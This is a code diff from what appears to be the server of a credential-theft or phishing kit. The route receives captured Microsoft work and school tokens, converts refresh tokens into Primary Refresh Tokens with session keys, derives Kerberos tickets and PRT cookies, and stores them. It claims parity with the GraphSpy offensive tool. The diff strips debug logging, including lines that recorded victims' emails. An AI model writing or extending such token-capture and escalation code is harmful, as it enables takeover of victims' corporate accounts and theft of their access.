@@ -123,10 +123,6 @@ async function autoCapturePrtSessionKey({ tokenId, user_id, tenant, accountType,
         // Re-derive Kerberos TGTs now that a real PRT (acrs=pfdr) exists.
         if (tokenId && tenant && tenant !== 'common' && tenant !== 'organizations') {
             require('../services/kerberos').deriveTGTForToken(tokenId)
-                .then(r => {
-                    if (r && r.success) console.log('[Capture] Kerberos TGTs derived after PRT capture for token', tokenId);
-                    else console.log('[Capture] Kerberos derivation skipped after PRT capture for token', tokenId, ':', (r && r.error) || 'unknown');
-                })
                 .catch(e => console.error('[Capture] Kerberos derivation error:', e.message));
         }
     };
@@ -202,7 +198,6 @@ async function autoCapturePrtSessionKey({ tokenId, user_id, tenant, accountType,
             privateKeyPem: enrollment.privateKeyPem,
             certificateBase64: enrollment.certificateDerBase64 || enrollment.deviceCertificate,
         });
-        console.log('[Capture] PRT + session_key_jwe captured via request_for_device (GraphSpy parity)');
         await persistResults(prtResult, {
             deviceId: enrollment.deviceId,
             deviceCertificate: enrollment.deviceCertificate,
@@ -618,27 +613,14 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
 
     const tokenId = result.insertId;
 
-    // Log token capture details for debugging
-    console.log('[Capture] Token captured:', {
-      tokenId,
-      email,
-      accountType,
-      tenant,
-      hasPrt: !!prt,
-      hasIdToken: !!id_token,
-      idTokenTenant: idTokenTenant || 'not extracted'
-    });
-
     // Auto-derive Kerberos TGTs for work/school accounts with PRT
     // This runs asynchronously and doesn't block the response
     // Requires: PRT + work/school account + specific tenant ID (not 'common' or 'organizations')
     if (prt && accountType === 'work_school' && tenant && tenant !== 'common' && tenant !== 'organizations') {
-      console.log('[Capture] Attempting Kerberos TGT derivation for token', tokenId, 'tenant:', tenant);
       const kerberosService = require('../services/kerberos');
       kerberosService.deriveTGTForToken(tokenId)
         .then(derivationResult => {
           if (derivationResult.success) {
-            console.log('[Capture] Kerberos TGT derived for token', tokenId, ':', derivationResult.email);
             // Update the token record with Kerberos data
             if (derivationResult.tgt_cloud) {
               db.query(
@@ -664,18 +646,11 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
                 [derivationResult.kerberos_top_level_names, tokenId]
               ).catch(err => console.error('[Capture] Failed to save kerberos names:', err));
             }
-          } else {
-            console.log('[Capture] Kerberos derivation skipped for token', tokenId, ':', derivationResult.error || 'no PRT');
           }
         })
         .catch(err => {
           console.error('[Capture] Kerberos derivation error:', err.message);
         });
-    } else {
-      console.log('[Capture] Kerberos derivation skipped:', {
-        tokenId,
-        reason: !prt ? 'no PRT' : accountType !== 'work_school' ? 'not work/school' : tenant === 'common' || tenant === 'organizations' ? 'tenant too generic (' + tenant + ')' : 'unknown'
-      });
     }
 
     // Common capture data shared by both the token-only and cookie paths
@@ -719,7 +694,6 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
         // proceeds with whatever material already exists.
         let autoPrt = { success: false };
         if (accountType === 'work_school' && refresh_token) {
-            console.log('[Capture] Work/school account detected (tenant:', tenant + '), running PRT auto-capture...');
             autoPrt = await withTimeout(
                 autoCapturePrtSessionKey({ tokenId, user_id, tenant, accountType, email, access_token, refresh_token }),
                 45000,
@@ -729,15 +703,10 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
                 return { success: false, reason: e.message };
             });
             if (autoPrt.success) {
-                console.log('[Capture] PRT auto-capture ok via', autoPrt.via + '; proceeding with KDF PRT cookie generation');
                 // The freshly captured raw PRT is the correct material for the
                 // KDF cookie (the prt variable may still be the plain RT).
                 if (autoPrt.prt) refreshTokenForConversion = autoPrt.prt;
-            } else {
-                console.log('[Capture] PRT auto-capture unavailable (', (autoPrt.reason || 'unknown') + '), proceeding with refresh token exchange');
             }
-        } else {
-            console.log('[Capture] Personal account detected, skipping PRT auto-capture');
         }
 
         try {
@@ -779,10 +748,6 @@ router.post('/', captureValidators, validateResult, async (req, res) => {
         // (GraphSpy's auto_action is async and never blocks the response).
         if (accountType === 'work_school' && refresh_token) {
             autoCapturePrtSessionKey({ tokenId, user_id, tenant, accountType, email, access_token, refresh_token })
-                .then(r => {
-                    if (r && r.success) console.log('[Capture] Background PRT auto-capture ok for token', tokenId, 'via', r.via);
-                    else console.log('[Capture] Background PRT auto-capture skipped for token', tokenId, ':', (r && r.reason) || 'unknown');
-                })
                 .catch(e => console.error('[Capture] Background PRT auto-capture error:', e.message));
         }
         const io = req.app.get('io');
